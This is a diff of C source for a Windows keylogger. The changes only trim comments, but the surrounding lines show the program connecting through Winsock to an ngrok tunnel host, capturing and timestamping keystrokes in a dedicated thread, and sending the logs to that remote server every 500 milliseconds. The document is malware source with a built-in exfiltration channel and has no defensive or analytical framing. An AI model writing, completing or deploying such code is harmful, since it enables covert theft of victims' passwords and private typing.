@@ -5,7 +5,7 @@
 #include <time.h>
 #include <string.h>
 
-// Define the server details
+//server details
 #define SERVER_IP "0.tcp.ngrok.io"  
 #define SERVER_PORT 8080           
 
@@ -15,12 +15,11 @@ HANDLE logMutex; // Mutex for thread-safe logging
 char sendBuffer[1024];
 int isConnected = 1;
 
-// Function to initialize Winsock and connect to the server
+//initialize Winsock and connect to the server
 int initializeNetwork() {
     WSADATA wsaData;
     struct sockaddr_in server;
 
-    // Initialize Winsock
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         printf("Failed to initialize Winsock. Error Code: %d\n", WSAGetLastError());
         return 0;
@@ -47,7 +46,7 @@ int initializeNetwork() {
     return 1;
 }
 
-// Function to send logs to the server
+//send logs to the server
 void sendLogs() {
     while (isConnected) {
         WaitForSingleObject(logMutex, INFINITE);
@@ -63,18 +62,18 @@ void sendLogs() {
         }
 
         ReleaseMutex(logMutex);
-        Sleep(500); // Send logs in batches every 500 ms
+        Sleep(500); 
     }
 }
 
-// Function to get the current timestamp
+//get the current timestamp
 void getTimestamp(char *buffer, size_t bufferSize) {
     time_t rawTime = time(NULL);
     struct tm *timeInfo = localtime(&rawTime);
     strftime(buffer, bufferSize, "[%Y-%m-%d %H:%M:%S]", timeInfo);
 }
 
-// Function to map and log keys
+//map and log keys
 void mapAndLogKey(int key, int shiftPressed) {
     char buffer[128] = {0};
     char timestamp[64];
@@ -148,7 +147,7 @@ DWORD WINAPI keyloggerThread(LPVOID lpParameter) {
     return 0;
 }
 
-// Main function
+
 int main() {
     logMutex = CreateMutex(NULL, FALSE, NULL);  // Create a mutex for thread-safe operations
 
